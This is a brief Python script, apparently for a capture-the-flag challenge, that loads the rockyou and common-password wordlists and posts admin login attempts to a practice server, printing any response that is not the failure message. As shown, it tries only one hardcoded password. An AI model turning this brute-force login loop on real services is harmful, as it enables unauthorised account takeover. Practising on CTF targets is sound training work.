import requests
import bz2
from time import sleep

filename = '/Users/b.baker/Desktop/rockyou.txt.bz2'

file = bz2.open(filename)

lines = file.readlines()

lines_2 = [w.decode('latin-1').strip() for w in lines]

request_url = 'http://challenges.laptophackingcoffee.org:5881'

file_dir = '/Users/b.baker/workspace/SecLists/Passwords/Common-Credentials/'
f_1 = '10k-most-common.txt'

with open(f'{file_dir}{f_1}', 'rb') as f:
    ll = f.readlines()
l_2 = [_.decode('utf-8').strip() for _ in ll]

session = requests.Session()
for pword in [1]:

    headers = {'User-Agent': 'Mozilla/5.0'}
    payload = {'username': 'admin',
               'password': 'wbox123',
               'login': 'Submit'}

    result = session.post(request_url, headers=headers, data=payload)
    content = result.content.decode('utf-8')
    if content != 'password is not correct !':
        print(f'{pword}: {content}')
    else:
        print(pword)
    sleep(100/1000)
